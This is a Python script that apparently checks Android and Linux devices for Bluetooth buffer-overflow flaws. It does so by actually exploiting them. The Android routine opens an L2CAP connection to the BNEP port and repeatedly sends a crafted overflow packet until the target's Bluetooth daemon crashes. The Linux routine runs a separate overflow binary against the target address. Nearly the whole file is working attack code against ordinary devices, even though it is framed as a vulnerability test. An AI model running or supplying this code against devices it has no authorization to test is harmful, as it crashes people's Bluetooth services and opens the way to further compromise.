import os
import sys
import time
import struct
import select
import binascii
import bluetooth

from bluetooth import _bluetooth as bt
from pwn import *

PWNING_TIMEOUT = 3
BNEP_PSM = 15

# Connects to the target with bnep and sends the payload which cause the bufferoverflow
def doBufferOverflowAndroid(dst, src):
    prog = log.progress('Connecting to BNEP and do bufferoverflow')
    acl_name_addr = 0xAAAAAAAA
    try:
        bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        bnep.bind((src, 0))
        bnep.connect((dst, BNEP_PSM))

        for i in range(1000):
            # If we're blocking here, the daemon has crashed
            _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
            if not writeable:
                log.info("Bluetooth service crashed! Device is vulnerable!")
                prog.success()
                break
            
            bnep.send(binascii.unhexlify('810100') +
                    struct.pack('<II', 0, acl_name_addr))
        else:
            log.info("Bluetooth service didn't crash after multiple trys. Device is not vulnerable!")
    except Exception as e:
        print(e)
        log.info("Couldn't exexute overflow, can't establish a connection to device!")

    prog.success()

# Connects to the target with bnep and sends the payload which cause the bufferoverflow
def doBufferOverflowLinux(dst):
    prog = log.progress('Connecting to L2CAP and do bufferoverflow')
    
    try:
        sock=bluetooth.BluetoothSocket( bluetooth.L2CAP )
        sock.connect((dst, 1))
    except:
        log.info("Device not reachable! Can't test it!")
        prog.success()
        return

    sock.close()
    os.system('./LinuxOverflow/test %s' % (dst))
    time.sleep(20)

    try:
        sock=bluetooth.BluetoothSocket( bluetooth.L2CAP )
        sock.connect((dst, 1))
    except:
        log.info("Bluetooth crashed! Device is vulnerable!")     
        prog.success()
        return

    log.info("Bluetooth service didn't crash. Device is not vulnerable!")
    prog.success()